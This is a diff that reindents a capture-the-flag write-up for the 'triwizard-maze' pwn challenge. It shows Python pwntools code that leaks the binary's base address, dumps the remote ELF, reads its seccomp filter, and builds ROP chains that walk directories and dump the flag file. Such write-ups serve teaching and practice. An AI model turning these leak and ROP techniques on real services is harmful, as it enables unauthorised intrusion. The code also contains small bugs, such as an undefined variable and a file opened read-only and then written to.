@@ -46,23 +46,23 @@ from pwn import *
 context(arch='i386')
 
 for offset in range(0, 0x100000, 0x1000):
- REMOTE = remote('triwizard-maze.challs.cyberchallenge.it', 38202)
- REMOTE.recvuntil(b'print(const void *buf, size_t n) is at ')
- print_fn = int(r.recvline(), 0)
+	REMOTE = remote('triwizard-maze.challs.cyberchallenge.it', 38202)
+	REMOTE.recvuntil(b'print(const void *buf, size_t n) is at ')
+	print_fn = int(r.recvline(), 0)
 
- REMOTE.recvuntil(b'):\n')
- base = (print_fn & ~0xfff) - offset
- chain = flat(print_fn, 0, base, 4)
- REMOTE.send(chain.ljust(1024))
+	REMOTE.recvuntil(b'):\n')
+	base = (print_fn & ~0xfff) - offset
+	chain = flat(print_fn, 0, base, 4)
+	REMOTE.send(chain.ljust(1024))
 
- try:
-  if REMOTE.recvn(4) == b'\x7fELF':
-   log.success('ELF base is at %x', base)
-   break
- except EOFError:
-  pass
+	try:
+		if REMOTE.recvn(4) == b'\x7fELF':
+			log.success('ELF base is at %x', base)
+			break
+	except EOFError:
+		pass
 
- REMOTE.close()
+	REMOTE.close()
 ```
 
 We can then either start dumping one page (4096 bytes) at a time from the base
@@ -76,7 +76,7 @@ chain = flat(print_fn, 0, base, 0x10000)
 REMOTE.sendlineafter(b'):\n', chain.ljust(1024))
 
 with open('dump.elf', 'rb') as f:
- f.write(r.recvall())
+	f.write(r.recvall())
 
 REMOTE.close()
 ```
@@ -165,8 +165,8 @@ keeps an array of 32 structures of the form:
 
 ```c
 struct node {
- int dirfd;
- unsigned n_children;
+	int dirfd;
+	unsigned n_children;
 };
 
 struct node dirs[32];
@@ -224,21 +224,21 @@ In fact, if correctly dumped, the remote ELF executable can be run locally under
 ```none
 $ FLAG=asd seccomp-tools ./dump.elf
 ...
- line  CODE  JT   JF      K
+line  CODE  JT   JF      K
 =================================
- 0000: 0x20 0x00 0x00 0x00000004  A = arch
- 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
- 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
- 0003: 0x15 0x08 0x00 0x00000059  if (A == readdir) goto 0012
- 0004: 0x15 0x07 0x00 0x00000003  if (A == read) goto 0012
- 0005: 0x15 0x06 0x00 0x00000004  if (A == write) goto 0012
- 0006: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0012
- 0007: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0012
- 0008: 0x15 0x00 0x02 0x00000127  if (A != openat) goto 0011
- 0009: 0x20 0x00 0x00 0x00000018  A = filename # openat(dfd, filename, flags, mode)
- 0010: 0x15 0x01 0x00 0x13375d60  if (A == 0x13375d60) goto 0012
- 0011: 0x06 0x00 0x00 0x00000000  return KILL
- 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+0000: 0x20 0x00 0x00 0x00000004  A = arch
+0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
+0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+0003: 0x15 0x08 0x00 0x00000059  if (A == readdir) goto 0012
+0004: 0x15 0x07 0x00 0x00000003  if (A == read) goto 0012
+0005: 0x15 0x06 0x00 0x00000004  if (A == write) goto 0012
+0006: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0012
+0007: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0012
+0008: 0x15 0x00 0x02 0x00000127  if (A != openat) goto 0011
+0009: 0x20 0x00 0x00 0x00000018  A = filename # openat(dfd, filename, flags, mode)
+0010: 0x15 0x01 0x00 0x13375d60  if (A == 0x13375d60) goto 0012
+0011: 0x06 0x00 0x00 0x00000000  return KILL
+0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```
 
 From what we can see above, the filter only allows a few syscalls: `readdir`,
@@ -282,14 +282,14 @@ The functions we will need to call for our exploit are the following:
 
 ```python
 EXE_SYMBOLS: dict[str,int] = {
- 'syscall3'   : 0x133722cd, # long syscall3(long num, long a1, long a2, long a3)
- 'print_str'  : 0x13372d29, # void print_str(const char *s)
- 'write_exact': 0x13372f58, # void write_exact(int fd, const void *buf, size_t count)
- 'read_exact' : 0x13372edc, # void read_exact(int fd, void *buf, size_t count)
- 'read'       : 0x133723af, # ssize_t read(int fd, void *buf, size_t count)
- 'openat'     : 0x1337238f, # int openat(int dirfd, const char *pathname, int flags, mode_t mode)
- 'close'      : 0x133723e3, # int close(int fd)
- 'go'         : 0x13371f47  # void go(void): asks for a new ROP chain and runs it
+	'syscall3'   : 0x133722cd, # long syscall3(long num, long a1, long a2, long a3)
+	'print_str'  : 0x13372d29, # void print_str(const char *s)
+	'write_exact': 0x13372f58, # void write_exact(int fd, const void *buf, size_t count)
+	'read_exact' : 0x13372edc, # void read_exact(int fd, void *buf, size_t count)
+	'read'       : 0x133723af, # ssize_t read(int fd, void *buf, size_t count)
+	'openat'     : 0x1337238f, # int openat(int dirfd, const char *pathname, int flags, mode_t mode)
+	'close'      : 0x133723e3, # int close(int fd)
+	'go'         : 0x13371f47  # void go(void): asks for a new ROP chain and runs it
 }
 ```
 
@@ -321,17 +321,17 @@ to do this:
 
 ```python
 def call(funcname: str, *args: int) -> bytes:
- assert 0 <= len(args) <= 4, args
+	assert 0 <= len(args) <= 4, args
 
- if len(args) == 0:
-  # No need to clean any args from the stack after the call
-  clean_stack = ()
- else:
-  # Need clean some args from the stack after the call, pop as many
-  # registers as function arguments
-  clean_stack = CLEAN_STACK_GADGET + 4 - len(args)
+	if len(args) == 0:
+		# No need to clean any args from the stack after the call
+		clean_stack = ()
+	else:
+		# Need clean some args from the stack after the call, pop as many
+		# registers as function arguments
+		clean_stack = CLEAN_STACK_GADGET + 4 - len(args)
 
- return flat(EXE_SYMBOLS[funcname], clean_stack, args)
+	return flat(EXE_SYMBOLS[funcname], clean_stack, args)
 ```
 
 Then we can write an helper function that can send a chain and restart the
@@ -339,12 +339,12 @@ Then we can write an helper function that can send a chain and restart the
 
 ```python
 def send_chain(chain: bytes):
- # Add a call to re-start the go() func to read a new chain after this one
- chain += call('go')
- assert len(chain) <= 1024, f'Chain too long: {len(chain)}'
+	# Add a call to re-start the go() func to read a new chain after this one
+	chain += call('go')
+	assert len(chain) <= 1024, f'Chain too long: {len(chain)}'
 
- REMOTE.recvuntil(b'Give me your x86 32bit ROP chain (exactly 1024 bytes):\n')
- REMOTE.send(chain.ljust(1024, b'\0'))
+	REMOTE.recvuntil(b'Give me your x86 32bit ROP chain (exactly 1024 bytes):\n')
+	REMOTE.send(chain.ljust(1024, b'\0'))
 ```
 
 To list the files in a directory we must open the directory first using the only
@@ -356,11 +356,11 @@ at `0x13372edc` to read an arbitrary string at that address before passing it to
 
 ```python
 def openat(dirfd: int, name: str):
- name = name.encode() + b'\0'
- chain = call('read_exact', 0, EXE_SYMBOLS['triwizard_cup_fname'], len(name))
- chain += call('openat', dirfd, EXE_SYMBOLS['triwizard_cup_fname'], 0, 0)
- send_chain(chain)
- REMOTE.send(name) # filename for openat(), read by read_exact()
+	name = name.encode() + b'\0'
+	chain = call('read_exact', 0, EXE_SYMBOLS['triwizard_cup_fname'], len(name))
+	chain += call('openat', dirfd, EXE_SYMBOLS['triwizard_cup_fname'], 0, 0)
+	send_chain(chain)
+	REMOTE.send(name) # filename for openat(), read by read_exact()
 ```
 
 It's also nice to be able to `close` directories as we don't know the remote
@@ -369,7 +369,7 @@ This is pretty simple, just a single call:
 
 ```python
 def close(fd: int):
- send_chain(call('close', fd))
+	send_chain(call('close', fd))
 ```
 
 After opening a directory we can use the [`readdir(2)`][man-2-readdir] syscall
@@ -378,10 +378,10 @@ the output, and a third ignored argument. The output struct looks like this:
 
 ```c
 struct old_linux_dirent {
- unsigned long d_ino;     /* inode number */
- unsigned long d_offset;  /* offset to this old_linux_dirent */
- unsigned short d_namlen; /* length of this d_name */
- char  d_name[1];         /* filename (null-terminated) */
+	unsigned long d_ino;     /* inode number */
+	unsigned long d_offset;  /* offset to this old_linux_dirent */
+	unsigned short d_namlen; /* length of this d_name */
+	char  d_name[1];         /* filename (null-terminated) */
 }
 ```
 
@@ -416,33 +416,33 @@ from pwnlib.constants.linux.i386 import SYS_readdir
 RW_BUF = 0x13375e70 # (.bss + 0x10)
 
 def listdir(dirfd: int) -> list[str]:
- # Call readdir two times to skip "." and ".." as they are always present
- chain = call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)
- chain += call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)
+	# Call readdir two times to skip "." and ".." as they are always present
+	chain = call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)
+	chain += call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)
 
- # List at most 10 entries
- for _ in range(10):
-  chain += call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)
-  chain += call('print_str', RW_BUF + 4 + 4 + 2) # d_name
-  chain += call('print_str', 0x133700a5) # "\n"
+	# List at most 10 entries
+	for _ in range(10):
+		chain += call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)
+		chain += call('print_str', RW_BUF + 4 + 4 + 2) # d_name
+		chain += call('print_str', 0x133700a5) # "\n"
 
- send_chain(chain)
+	send_chain(chain)
 
- res = []
- last = None
+	res = []
+	last = None
 
- for _ in range(10):
-  name = REMOTE.recvline(keepends=False).decode()
+	for _ in range(10):
+		name = REMOTE.recvline(keepends=False).decode()
 
-  # Skip duplicates, if we get any it just means there are < 10 entries
-  if name != last:
-   res.append(name)
-   last = name
+		# Skip duplicates, if we get any it just means there are < 10 entries
+		if name != last:
+			res.append(name)
+			last = name
 
- # If we only get ".." it means there was nothing after "..", so this dir is empty
- if res == ['..']:
-  return []
- return res
+	# If we only get ".." it means there was nothing after "..", so this dir is empty
+	if res == ['..']:
+		return []
+	return res
 ```
 
 One last thing before implementing our search function: we need to be able to
@@ -453,10 +453,10 @@ functions already implemented for us).
 
 ```python
 def dumpfd(fd: int):
- chain = call('read', fd, RW_BUF, 0x100)
- chain += call('write_exact', 1, RW_BUF, 0x100)
- send_chain(chain)
- return REMOTE.recvn(0x100)
+	chain = call('read', fd, RW_BUF, 0x100)
+	chain += call('write_exact', 1, RW_BUF, 0x100)
+	send_chain(chain)
+	return REMOTE.recvn(0x100)
 ```
 
 Now we can implement the actual search function. As mentioned at the beginning,
@@ -466,9 +466,9 @@ a recursive [DFS][wiki-dfs] is the simplest way to go:
   `openat(AT_FDCWD, "entry", O_RDONLY, 0)`.
 - Iterate the entries of the current directory.
 - For each entry:
-  - If its name is `"triwizard_cup"`, open and dump the file with `dumpfd()`.
-  - Otherwise, it's a directory: open it, explore it recursively and finally
-    close it.
+- If its name is `"triwizard_cup"`, open and dump the file with `dumpfd()`.
+- Otherwise, it's a directory: open it, explore it recursively and finally
+  close it.
 
 Since the program closes every file descriptor higher than `1` after creating
 the maze, and `open`/`openat` always return the lowest free FD number, we know
@@ -484,22 +484,22 @@ Here's the search function:
 ```python
 # Recursive DFS until we get to "triwizard_cup"
 def explore_maze(dirfd: int):
- for fname in listdir(dirfd):
-  if fname == 'triwizard_cup':
-   # This is the file we were looking for: dump it
-   openat(dirfd, fname)
-   return dumpfd(dirfd + 1)
+	for fname in listdir(dirfd):
+		if fname == 'triwizard_cup':
+			# This is the file we were looking for: dump it
+			openat(dirfd, fname)
+			return dumpfd(dirfd + 1)
 
-  # Otherwise, this is a directory: explore it recursively
-  openat(dirfd, fname)
-  flag = explore_maze(dirfd + 1)
-  if flag is not None:
-   return flag
+		# Otherwise, this is a directory: explore it recursively
+		openat(dirfd, fname)
+		flag = explore_maze(dirfd + 1)
+		if flag is not None:
+			return flag
 
-  # Close current directory and keep going
-  close(dirfd + 1)
+		# Close current directory and keep going
+		close(dirfd + 1)
 
- return None
+	return None
 ```
 
 Finally! Now let's get the flag:
